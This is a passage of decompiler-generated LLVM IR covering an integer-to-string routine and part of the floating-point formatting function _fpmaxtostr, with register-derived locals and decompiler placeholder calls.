  %v2_8055ef1 = icmp slt i32 %arg3, 0
  %v1_8055ef3 = icmp eq i1 %v2_8055ef1, false
  br i1 %v1_8055ef3, label %dec_label_pc_8055f0e, label %dec_label_pc_8055ef5

dec_label_pc_8055ef5:                             ; preds = %dec_label_pc_8055eef
  %v1_8055ef5 = sub i32 0, %arg2
  %v5_8055ef5 = icmp ne i32 %arg2, 0
  store i32 %v1_8055ef5, i32* %ecx.global-to-local, align 4
  %v2_8055ef7 = zext i1 %v5_8055ef5 to i32
  %v3_8055ef7 = add i32 %v2_8055ef7, %arg3
  %v1_8055efa = sub i32 0, %v3_8055ef7
  store i32 %v1_8055efa, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055f0e

dec_label_pc_8055f0e:                             ; preds = %entry, %dec_label_pc_8055eef, %dec_label_pc_8055ef5
  %v0_8055f13 = phi i32 [ %v1_8055eef, %dec_label_pc_8055ef5 ], [ %v1_8055eef, %dec_label_pc_8055eef ], [ %arg4, %entry ]
  %storemerge12 = phi i32 [ 1, %dec_label_pc_8055ef5 ], [ 0, %dec_label_pc_8055eef ], [ 0, %entry ]
  %div = udiv i32 -1, %v0_8055f13
  %tmp31 = urem i32 -1, %v0_8055f13
  store i8 0, i8* %arg1, align 1
  %v1_8055f18 = add i32 %tmp31, 1
  %v1_8055f19 = load i32, i32* %esi.global-to-local, align 4
  %v12_8055f19 = icmp eq i32 %v1_8055f18, %v1_8055f19
  %v1_8055f23 = icmp eq i1 %v12_8055f19, false
  br i1 %v1_8055f23, label %dec_label_pc_8055f32, label %dec_label_pc_8055f25

dec_label_pc_8055f25:                             ; preds = %dec_label_pc_8055f0e
  %v1_8055f25 = add i32 %div, 1
  br label %dec_label_pc_8055f32

dec_label_pc_8055f32:                             ; preds = %dec_label_pc_8055f0e, %dec_label_pc_8055f25
  %stack_var_-20.0.off0 = phi i32 [ %v1_8055f18, %dec_label_pc_8055f0e ], [ 0, %dec_label_pc_8055f25 ]
  %stack_var_-24.0.in = phi i32 [ %div, %dec_label_pc_8055f0e ], [ %v1_8055f25, %dec_label_pc_8055f25 ]
  %v0_8055f32 = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_8055f32, i32* %ebp.global-to-local, align 4
  %v0_8055f34 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8055f34, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8055f38

dec_label_pc_8055f38:                             ; preds = %dec_label_pc_8055f86, %dec_label_pc_8055f32
  %v0_8055f6f = phi i32 [ %v0_8055f88, %dec_label_pc_8055f86 ], [ %v0_8055f32, %dec_label_pc_8055f32 ]
  %v0_8055f3c = phi i32 [ %v1_8055f8a, %dec_label_pc_8055f86 ], [ %v0_8055f34, %dec_label_pc_8055f32 ]
  %v1_8055f38 = icmp eq i32 %v0_8055f3c, 0
  br i1 %v1_8055f38, label %dec_label_pc_8055f6f, label %dec_label_pc_8055f3c

dec_label_pc_8055f3c:                             ; preds = %dec_label_pc_8055f38
  %v0_8055f40 = load i32, i32* %esi.global-to-local, align 4
  %div7 = udiv i32 %v0_8055f3c, %v0_8055f40
  %tmp32 = urem i32 %v0_8055f3c, %v0_8055f40
  store i32 %div7, i32* %ebx.global-to-local, align 4
  %div8 = udiv i32 %v0_8055f6f, %v0_8055f40
  %tmp33 = urem i32 %v0_8055f6f, %v0_8055f40
  store i32 %div8, i32* %ebp.global-to-local, align 4
  %v6_8055f53 = mul i32 %tmp32, %stack_var_-20.0.off0
  %v2_8055f57 = add i32 %tmp33, %v6_8055f53
  %v8_8055f5d = mul i32 %tmp32, %stack_var_-24.0.in
  %v2_8055f62 = add i32 %div8, %v8_8055f5d
  store i32 %v2_8055f62, i32* %ecx.global-to-local, align 4
  %div9 = udiv i32 %v2_8055f57, %v0_8055f40
  %tmp34 = urem i32 %v2_8055f57, %v0_8055f40
  %v2_8055f6a = add i32 %div9, %v2_8055f62
  br label %dec_label_pc_8055f77

dec_label_pc_8055f6f:                             ; preds = %dec_label_pc_8055f38
  %v0_8055f73 = load i32, i32* %esi.global-to-local, align 4
  %div11 = udiv i32 %v0_8055f6f, %v0_8055f73
  %tmp35 = urem i32 %v0_8055f6f, %v0_8055f73
  br label %dec_label_pc_8055f77

dec_label_pc_8055f77:                             ; preds = %dec_label_pc_8055f3c, %dec_label_pc_8055f6f
  %v13_8055f7d = phi i32 [ %tmp34, %dec_label_pc_8055f3c ], [ %tmp35, %dec_label_pc_8055f6f ]
  %storemerge = phi i32 [ %v2_8055f6a, %dec_label_pc_8055f3c ], [ %div11, %dec_label_pc_8055f6f ]
  store i32 %storemerge, i32* %ebp.global-to-local, align 4
  %v0_8055f77 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055f77 = add i32 %v0_8055f77, -1
  store i32 %v1_8055f77, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v13_8055f7d, 10
  br i1 %tmp, label %dec_label_pc_8055f7d, label %dec_label_pc_8055f82

dec_label_pc_8055f7d:                             ; preds = %dec_label_pc_8055f77
  %v2_8055f7d = add i32 %v13_8055f7d, 48
  %v12_8055f7d = and i32 %v2_8055f7d, 255
  %v14_8055f7d = and i32 %v13_8055f7d, -256
  %v15_8055f7d = or i32 %v12_8055f7d, %v14_8055f7d
  br label %dec_label_pc_8055f86

dec_label_pc_8055f82:                             ; preds = %dec_label_pc_8055f77
  %v6_8055f82 = add i32 %v13_8055f7d, %arg5
  %v21_8055f82 = and i32 %v6_8055f82, 255
  %v23_8055f82 = and i32 %v13_8055f7d, -256
  %v24_8055f82 = or i32 %v21_8055f82, %v23_8055f82
  br label %dec_label_pc_8055f86

dec_label_pc_8055f86:                             ; preds = %dec_label_pc_8055f7d, %dec_label_pc_8055f82
  %storemerge10 = phi i32 [ %v15_8055f7d, %dec_label_pc_8055f7d ], [ %v24_8055f82, %dec_label_pc_8055f82 ]
  %v1_8055f86 = trunc i32 %storemerge10 to i8
  %v3_8055f86 = inttoptr i32 %v1_8055f77 to i8*
  store i8 %v1_8055f86, i8* %v3_8055f86, align 1
  %v0_8055f88 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8055f8a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8055f8a = or i32 %v1_8055f8a, %v0_8055f88
  %v3_8055f8a = icmp eq i32 %v2_8055f8a, 0
  %v1_8055f8c = icmp eq i1 %v3_8055f8a, false
  br i1 %v1_8055f8c, label %dec_label_pc_8055f38, label %dec_label_pc_8055f8e

dec_label_pc_8055f8e:                             ; preds = %dec_label_pc_8055f86
  %v4_8055f8e = icmp eq i32 %storemerge12, 0
  br i1 %v4_8055f8e, label %dec_label_pc_8055f99, label %dec_label_pc_8055f95

dec_label_pc_8055f95:                             ; preds = %dec_label_pc_8055f8e
  %v0_8055f95 = load i32, i32* %edi.global-to-local, align 4
  %v1_8055f95 = add i32 %v0_8055f95, -1
  store i32 %v1_8055f95, i32* %edi.global-to-local, align 4
  %v1_8055f96 = inttoptr i32 %v1_8055f95 to i8*
  store i8 45, i8* %v1_8055f96, align 1
  br label %dec_label_pc_8055f99

dec_label_pc_8055f99:                             ; preds = %dec_label_pc_8055f8e, %dec_label_pc_8055f95
  %v0_8055f9c = load i32, i32* %edi.global-to-local, align 4
  ret i32 %v0_8055f9c

; uselistorder directives
  uselistorder i32 %v13_8055f7d, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_8055f57, { 1, 0 }
  uselistorder i32 %v0_8055f40, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v0_8055f3c, { 1, 0, 2 }
  uselistorder i32 %v0_8055f6f, { 1, 0, 3, 2 }
  uselistorder i32 %v1_8055f18, { 1, 0 }
  uselistorder i32 %v0_8055f13, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %edi.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 3, 1, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055f99, { 1, 0 }
  uselistorder label %dec_label_pc_8055f86, { 1, 0 }
  uselistorder label %dec_label_pc_8055f77, { 1, 0 }
  uselistorder label %dec_label_pc_8055f32, { 1, 0 }
  uselistorder label %dec_label_pc_8055f0e, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %st1.global-to-local = alloca x86_fp80, align 4
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp146 = call i16 @__decompiler_undefined_function_4()
  %tmp155 = call x86_fp80 @__decompiler_undefined_function_10()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8055fa5 = load i32, i32* @edi, align 4
  %v0_8055fa6 = load i32, i32* @esi, align 4
  %v0_8055fa7 = load i32, i32* @ebx, align 4
  store i32 %v0_8055fa7, i32* %stack_var_-16, align 4
  store i32 %tmp156, i32* %eax.global-to-local, align 4
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v4_8055fbc = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_8055fbc = add i3 %v4_8055fbc, -1
  store x86_fp80 %tmp155, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_8055fbc, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_8055fc3 = add i32 %tmp156, 4
  %v2_8055fc3 = inttoptr i32 %v1_8055fc3 to i32*
  %v3_8055fc3 = load i32, i32* %v2_8055fc3, align 4
  store i32 %v3_8055fc3, i32* %eax.global-to-local, align 4
  %v1_8055fca = add i32 %tmp156, 8
  %v2_8055fca = inttoptr i32 %v1_8055fca to i8*
  %v3_8055fca = load i8, i8* %v2_8055fca, align 1
  %v4_8055fca = zext i8 %v3_8055fca to i32
  %v6_8055fca = and i32 %v0_8055fa7, -256
  %v7_8055fca = or i32 %v4_8055fca, %v6_8055fca
  store i32 %v7_8055fca, i32* %ebx.global-to-local, align 4
  %v1_8055fcd = inttoptr i32 %tmp156 to i32*
  %v2_8055fcd = load i32, i32* %v1_8055fcd, align 4
  store i32 %v2_8055fcd, i32* %ebp.global-to-local, align 4
  %v2_8055fd9 = or i8 %v3_8055fca, 32
  %v7_8055fd9 = zext i8 %v2_8055fd9 to i32
  %v9_8055fd9 = and i32 %v3_8055fc3, -256
  %v10_8055fd9 = or i32 %v7_8055fd9, %v9_8055fd9
  store i32 %v10_8055fd9, i32* %eax.global-to-local, align 4
  %v10_8055fdb = icmp eq i8 %v2_8055fd9, 97
  %v1_8055fe1 = icmp eq i1 %v10_8055fdb, false
  br i1 %v1_8055fe1, label %dec_label_pc_8055fea, label %dec_label_pc_8055fe3

dec_label_pc_8055fe3:                             ; preds = %entry
  %v2_8055fe3 = add i8 %v3_8055fca, 6
  %v15_8055fe3 = zext i8 %v2_8055fe3 to i32
  %v18_8055fe3 = or i32 %v15_8055fe3, %v6_8055fca
  store i32 %v18_8055fe3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8055fea

dec_label_pc_8055fea:                             ; preds = %entry, %dec_label_pc_8055fe3
  %stack_var_-207.0 = phi i8 [ %v3_8055fca, %entry ], [ %v2_8055fe3, %dec_label_pc_8055fe3 ]
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8055ff1 = icmp slt i32 %v2_8055fcd, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_8056000 = select i1 %v2_8055ff1, i32 6, i32 %v2_8055fcd
  store i32 %v3_8056000, i32* %ebp.global-to-local, align 4
  %v1_8056003 = add i32 %tmp156, 12
  %v2_8056003 = inttoptr i32 %v1_8056003 to i32*
  %v3_8056003 = load i32, i32* %v2_8056003, align 4
  store i32 %v3_8056003, i32* %eax.global-to-local, align 4
  %v2_8056006 = and i32 %v3_8056003, 2
  %v3_8056006 = icmp eq i32 %v2_8056006, 0
  br i1 %v3_8056006, label %dec_label_pc_8056014, label %dec_label_pc_8056020

dec_label_pc_8056014:                             ; preds = %dec_label_pc_8055fea
  %v2_8056014 = urem i32 %v3_8056003, 2
  %tmp192 = trunc i32 %v2_8056014 to i8
  %tmp = sub nsw i8 0, %tmp192
  %tmp193 = and i8 %tmp, 32
  br label %dec_label_pc_8056020

dec_label_pc_8056020:                             ; preds = %dec_label_pc_8056014, %dec_label_pc_8055fea
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_8055fea ], [ %tmp193, %dec_label_pc_8056014 ]
  %not.v5_8056020 = fcmp uno x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v5_8056020, label %dec_label_pc_8056097, label %dec_label_pc_8056042

dec_label_pc_8056042:                             ; preds = %dec_label_pc_8056020
  %v1_8056042 = add i3 %v4_8055fbc, -2
  store i3 %v1_8056042, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 %tmp155, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_8056046 = fcmp ogt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v4_8056046, label %bb, label %bb180

bb:                                               ; preds = %dec_label_pc_8056042
  br label %dec_label_pc_80560d2

bb180:                                            ; preds = %dec_label_pc_8056042
  %v5_8056046 = fcmp olt x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %v5_8056046, label %bb181, label %dec_label_pc_805604a

bb181:                                            ; preds = %bb180
  br label %dec_label_pc_80560d2

dec_label_pc_805604a:                             ; preds = %bb180
  %not.v4_8056044 = fcmp une x86_fp80 %tmp155, 0xK00000000000000000000
  br i1 %not.v4_8056044, label %dec_label_pc_80560d2, label %dec_label_pc_8056167

dec_label_pc_8056097:                             ; preds = %dec_label_pc_8056020
  store i3 %v4_8055fbc, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_805609e = add i32 %tmp156, 16
  %v2_805609e = inttoptr i32 %v1_805609e to i32*
  store i32 32, i32* %v2_805609e, align 4
  %v4_80560a5 = add i8 %stack_var_-207.0, -96
  %v6_80560a5 = sub i8 95, %stack_var_-207.0
  %v7_80560a5 = and i8 %v6_80560a5, %stack_var_-207.0
  %v8_80560a5 = icmp slt i8 %v7_80560a5, 0
  %v9_80560a5 = icmp eq i8 %v4_80560a5, 0
  %v10_80560a5 = icmp slt i8 %v4_80560a5, 0
  store i32 3, i32* %stack_var_-152, align 4
  %v3_80560ba = icmp eq i1 %v10_80560a5, %v8_80560a5
  %v4_80560ba = icmp eq i1 %v9_80560a5, false
  %v5_80560ba = and i1 %v4_80560ba, %v3_80560ba
  br i1 %v5_80560ba, label %dec_label_pc_80560c1, label %dec_label_pc_80560bc

dec_label_pc_80560bc:                             ; preds = %dec_label_pc_8056097
  br label %dec_label_pc_80560c1

dec_label_pc_80560c1:                             ; preds = %dec_label_pc_8056097, %dec_label_pc_80560bc
  %v2_80560c9 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_80560c9, i32* @ecx, align 4
  br label %dec_label_pc_8056492

dec_label_pc_80560d2:                             ; preds = %dec_label_pc_805604a, %bb181, %bb
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store x86_fp80 0xK3FFD8000000000000000, x86_fp80* %st1.global-to-local, align 4
  store i32 13, i32* %edx.global-to-local, align 4
  store i32 4096, i32* %ecx.global-to-local, align 4
  %v3_80560ec = xor i3 %v4_8055fbc, -4
  store i3 %v3_80560ec, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_80560f2

dec_label_pc_80560f2:                             ; preds = %dec_label_pc_8056143, %dec_label_pc_80560d2
  %v0_8056143 = phi i32 [ 4096, %dec_label_pc_80560d2 ], [ %v2_8056143, %dec_label_pc_8056143 ]
  %v2_80560f5 = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_80560d2 ], [ %v2_80560f581, %dec_label_pc_8056143 ]
  %v1_805612d = phi x86_fp80 [ 0xK3FFD8000000000000000, %dec_label_pc_80560d2 ], [ %v0_80560f279, %dec_label_pc_8056143 ]
  %v0_805613f66 = phi i32 [ 13, %dec_label_pc_80560d2 ], [ %v1_80560f4, %dec_label_pc_8056143 ]
  %stack_var_-220.0 = phi i32 [ 8, %dec_label_pc_80560d2 ], [ %stack_var_-220.1, %dec_label_pc_8056143 ]
  %v1_80560f4 = add i32 %v0_805613f66, -1
  %v4_80560f5 = fcmp ule x86_fp80 %v1_805612d, %v2_80560f5
  br i1 %v4_80560f5, label %dec_label_pc_805611c, label %dec_label_pc_80560f9

dec_label_pc_80560f9:                             ; preds = %dec_label_pc_80560f2
  store x86_fp80 %v1_805612d, x86_fp80* %st0.global-to-local, align 4
  %v3_80560fb = mul i32 %v1_80560f4, 12
  store i32 %v3_80560fb, i32* %eax.global-to-local, align 4
  %v1_80560fe = add i32 %v3_80560fb, ptrtoint (x86_fp80** @global_var_805d3a0.575 to i32)
  %v2_80560fe = inttoptr i32 %v1_80560fe to x86_fp80*
  %v3_80560fe = load x86_fp80, x86_fp80* %v2_80560fe, align 4
  %v4_8056104 = fmul x86_fp80 %v1_805612d, %v3_80560fe
  store x86_fp80 %v4_8056104, x86_fp80* %st1.global-to-local, align 4
  %v4_8056108 = fcmp ule x86_fp80 %v4_8056104, %v3_80560fe
  br i1 %v4_8056108, label %dec_label_pc_805613d, label %dec_label_pc_805610c

dec_label_pc_805610c:                             ; preds = %dec_label_pc_80560f9
  store x86_fp80 %v4_8056104, x86_fp80* %st1.global-to-local, align 4
  %v5_8056116 = sub i32 %stack_var_-220.0, %v0_8056143
  br label %dec_label_pc_805613f

dec_label_pc_805611c:                             ; preds = %dec_label_pc_80560f2
  %v3_805611c = mul i32 %v1_80560f4, 12
  store i32 %v3_805611c, i32* %eax.global-to-local, align 4
  %v1_805611f = add i32 %v3_805611c, ptrtoint (x86_fp80** @global_var_805d3a0.575 to i32)
  %v2_805611f = inttoptr i32 %v1_805611f to x86_fp80*
  %v3_805611f = load x86_fp80, x86_fp80* %v2_805611f, align 4
  %v4_8056125 = fdiv x86_fp80 %v3_805611f, %v1_805612d
  store x86_fp80 %v4_8056125, x86_fp80* %st1.global-to-local, align 4
  %v4_8056127 = fcmp ogt x86_fp80 %v3_805611f, %v1_805612d
  br i1 %v4_8056127, label %.thread55, label %bb183

.thread55:                                        ; preds = %dec_label_pc_805611c
  store x86_fp80 %v3_805611f, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_805612d

bb183:                                            ; preds = %dec_label_pc_805611c
  %v5_8056127 = fcmp olt x86_fp80 %v3_805611f, %v1_805612d
  br i1 %v5_8056127, label %.thread51, label %bb184

.thread51:                                        ; preds = %bb183
  store x86_fp80 %v3_805611f, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_805613d

bb184:                                            ; preds = %bb183
  %not.v6_8056127 = fcmp une x86_fp80 %v3_805611f, %v1_805612d
  store x86_fp80 %v3_805611f, x86_fp80* %st1.global-to-local, align 4
  br i1 %not.v6_8056127, label %dec_label_pc_805613d, label %dec_label_pc_805612d

dec_label_pc_805612d:                             ; preds = %.thread55, %bb184
  store x86_fp80 %v3_805611f, x86_fp80* %st1.global-to-local, align 4
  %v5_8056137 = add i32 %stack_var_-220.0, %v0_8056143
  br label %dec_label_pc_805613f

dec_label_pc_805613d:                             ; preds = %dec_label_pc_80560f9, %.thread51, %bb184
  %v1_805613d = phi x86_fp80 [ %v1_805612d, %.thread51 ], [ %v1_805612d, %bb184 ], [ %v3_80560fe, %dec_label_pc_80560f9 ]
  %v0_80560f280 = phi x86_fp80 [ %v3_805611f, %.thread51 ], [ %v3_805611f, %bb184 ], [ %v4_8056104, %dec_label_pc_80560f9 ]
  store x86_fp80 %v1_805613d, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805613f

dec_label_pc_805613f:                             ; preds = %dec_label_pc_805612d, %dec_label_pc_805610c, %dec_label_pc_805613d
  %v2_80560f581 = phi x86_fp80 [ %v1_805613d, %dec_label_pc_805613d ], [ %v2_80560f5, %dec_label_pc_805612d ], [ %v1_805612d, %dec_label_pc_805610c ]
  %v0_80560f279 = phi x86_fp80 [ %v0_80560f280, %dec_label_pc_805613d ], [ %v3_805611f, %dec_label_pc_805612d ], [ %v4_8056104, %dec_label_pc_805610c ]
  %stack_var_-220.1 = phi i32 [ %stack_var_-220.0, %dec_label_pc_805613d ], [ %v5_8056137, %dec_label_pc_805612d ], [ %v5_8056116, %dec_label_pc_805610c ]
  %v1_805613f = icmp eq i32 %v1_80560f4, 0
  br i1 %v1_805613f, label %.thread60, label %dec_label_pc_8056143

dec_label_pc_8056143:                             ; preds = %dec_label_pc_805613f
  %v2_8056143 = sdiv i32 %v0_8056143, 2
  store i32 %v2_8056143, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80560f2

.thread60:                                        ; preds = %dec_label_pc_805613f
  store i32 0, i32* %edx.global-to-local, align 4
  store x86_fp80 0xK4019BEBC200000000000, x86_fp80* %st1.global-to-local, align 4
  br label %dec_label_pc_8056167

dec_label_pc_8056167:                             ; preds = %dec_label_pc_805604a, %.thread60
  %v0_8056221 = phi i32 [ %stack_var_-220.1, %.thread60 ], [ -1, %dec_label_pc_805604a ]
  %storemerge = phi x86_fp80 [ 0xK401CEE6B280000000000, %.thread60 ], [ 0xK3FFF8000000000000000, %dec_label_pc_805604a ]
  store x86_fp80 %storemerge, x86_fp80* %st0.global-to-local, align 4
  %v2_805616b = ptrtoint i32* %stack_var_-70 to i32
  store i32 0, i32* @edi, align 4
  store x86_fp80 0xK401CEE6B280000000000, x86_fp80* %st1.global-to-local, align 4
  store i3 %v1_8056042, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_805617e = and i32 %v2_805616b, -65536
  %v1_8056183 = udiv i16 %tmp146, 256
  %v2_8056183 = zext i16 %v1_8056183 to i32
  %v3_8056183 = or i32 %v2_8056183, 12
  %v10_8056183 = mul nuw nsw i32 %v3_8056183, 256
  %tmp194 = urem i16 %tmp146, 256
  %v4_805617e.masked = zext i16 %tmp194 to i32
  %v11_8056183 = or i32 %v10_8056183, %v4_805617e.masked
  %v12_8056183 = or i32 %v11_8056183, %v6_805617e
  store i32 %v12_8056183, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805618b

dec_label_pc_805618b:                             ; preds = %dec_label_pc_80561dd.dec_label_pc_805618b_crit_edge, %dec_label_pc_8056167
  %v2_80561b0 = phi x86_fp80 [ %storemerge, %dec_label_pc_8056167 ], [ %v2_80561b0.pre, %dec_label_pc_80561dd.dec_label_pc_805618b_crit_edge ]
  %v1_805618b = phi i3 [ %v1_8056042, %dec_label_pc_8056167 ], [ %v1_805618b.pre, %dec_label_pc_80561dd.dec_label_pc_805618b_crit_edge ]
  %v3_80561b2 = phi x86_fp80 [ 0xK401CEE6B280000000000, %dec_label_pc_8056167 ], [ %v0_805618b.pre, %dec_label_pc_80561dd.dec_label_pc_805618b_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_805616b, %dec_label_pc_8056167 ], [ %v4_80561ab, %dec_label_pc_80561dd.dec_label_pc_805618b_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %tmp195 = fptosi x86_fp80 %v3_80561b2 to i32
  store i32 %tmp195, i32* %eax.global-to-local, align 4
  store i32 %tmp195, i32* %ecx.global-to-local, align 4
  %v5_80561a5 = sitofp i32 %tmp195 to x86_fp80
  %v4_80561ab = add i32 %stack_var_-212.0, 9
  %v4_80561b0 = fsub x86_fp80 %v2_80561b0, %v5_80561a5
  store i3 %v1_805618b, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80561b2 = fmul x86_fp80 %v3_80561b2, %v4_80561b0
  store x86_fp80 %v4_80561b2, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_80561b4

dec_label_pc_80561b4:                             ; preds = %dec_label_pc_80561b4.dec_label_pc_80561b4_crit_edge, %dec_label_pc_805618b
  %v0_80561c8 = phi i32 [ %v0_80561c8.pre, %dec_label_pc_80561b4.dec_label_pc_80561b4_crit_edge ], [ %tmp195, %dec_label_pc_805618b ]
  %v0_80561b8 = phi i32 [ %v0_80561b8.pre, %dec_label_pc_80561b4.dec_label_pc_80561b4_crit_edge ], [ 0, %dec_label_pc_805618b ]
  %v1_80561b8 = add i32 %v0_80561b8, 1
  store i32 %v1_80561b8, i32* %esi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_80561c2 = sub i32 %v4_80561ab, %v1_80561b8
  %div = udiv i32 %v0_80561c8, 10
  %tmp185 = urem i32 %v0_80561c8, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_80561ce = and i32 %div, 536870656
  store i32 %v2_80561c2, i32* %edx.global-to-local, align 4
  %v1_80561d4 = trunc i32 %tmp185 to i8
  %v2_80561d4 = or i8 %v1_80561d4, 48
  %v12_80561d4 = zext i8 %v2_80561d4 to i32
  %v15_80561d4 = or i32 %v12_80561d4, %v3_80561ce
  store i32 %v15_80561d4, i32* %eax.global-to-local, align 4
  %v3_80561d9 = inttoptr i32 %v2_80561c2 to i8*
  store i8 %v2_80561d4, i8* %v3_80561d9, align 1
  %v7_80561db = icmp sgt i32 %v1_80561b8, 8
  br i1 %v7_80561db, label %dec_label_pc_80561dd, label %dec_label_pc_80561b4.dec_label_pc_80561b4_crit_edge

dec_label_pc_80561b4.dec_label_pc_80561b4_crit_edge: ; preds = %dec_label_pc_80561b4
  %v0_80561b8.pre = load i32, i32* %esi.global-to-local, align 4
  %v0_80561c8.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80561b4

dec_label_pc_80561dd:                             ; preds = %dec_label_pc_80561b4
  %v0_80561dd = load i32, i32* @edi, align 4
  %v1_80561dd = add i32 %v0_80561dd, 1
  store i32 %v1_80561dd, i32* @edi, align 4
  %v7_80561e1 = icmp sgt i32 %v1_80561dd, 2
  br i1 %v7_80561e1, label %dec_label_pc_80561e3, label %dec_label_pc_80561dd.dec_label_pc_805618b_crit_edge

dec_label_pc_80561dd.dec_label_pc_805618b_crit_edge: ; preds = %dec_label_pc_80561dd
  %v0_805618b.pre = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  %v1_805618b.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_80561b0.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_805618b

dec_label_pc_80561e3:                             ; preds = %dec_label_pc_80561dd
  %v0_80561e3 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80561e3 = load x86_fp80, x86_fp80* %st1.global-to-local, align 4
  store x86_fp80 %v1_80561e3, x86_fp80* %st0.global-to-local, align 4
  %v2_80561e5 = add i3 %v0_80561e3, 2
  store i3 %v2_80561e5, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_80561e7 = add i8 %stack_var_-207.0, -96
  %v6_80561e7 = sub i8 95, %stack_var_-207.0
  %v7_80561e7 = and i8 %v6_80561e7, %stack_var_-207.0
  %v8_80561e7 = icmp slt i8 %v7_80561e7, 0
  %v9_80561e7 = icmp eq i8 %v4_80561e7, 0
  %v10_80561e7 = icmp slt i8 %v4_80561e7, 0
  %v3_80561ec = icmp eq i1 %v10_80561e7, %v8_80561e7
  %v4_80561ec = icmp eq i1 %v9_80561e7, false
  %v5_80561ec = and i1 %v4_80561ec, %v3_80561ec
  br i1 %v5_80561ec, label %dec_label_pc_80561fb, label %dec_label_pc_80561ee

dec_label_pc_80561ee:                             ; preds = %dec_label_pc_80561e3
  %v4_80561ee = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_80561fb

dec_label_pc_80561fb:                             ; preds = %dec_label_pc_80561e3, %dec_label_pc_80561ee
  %stack_var_-207.1 = phi i8 [ %stack_var_-207.0, %dec_label_pc_80561e3 ], [ %v4_80561ee, %dec_label_pc_80561ee ]
  %stack_var_-42.0 = phi i32 [ 101, %dec_label_pc_80561e3 ], [ 69, %dec_label_pc_80561ee ]
  %v12_80561fb = icmp eq i8 %stack_var_-207.1, 103
  %v1_8056200 = icmp eq i1 %v12_80561fb, false
  br i1 %v1_8056200, label %dec_label_pc_8056209, label %dec_label_pc_8056202

dec_label_pc_8056202:                             ; preds = %dec_label_pc_80561fb
  %v0_8056202 = load i32, i32* %ebp.global-to-local, align 4
  %tmp186 = icmp slt i32 %v0_8056202, 1
  br i1 %tmp186, label %dec_label_pc_8056210, label %dec_label_pc_8056206

dec_label_pc_8056206:                             ; preds = %dec_label_pc_8056202
  %v1_8056206 = add i32 %v0_8056202, -1
  store i32 %v1_8056206, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8056210

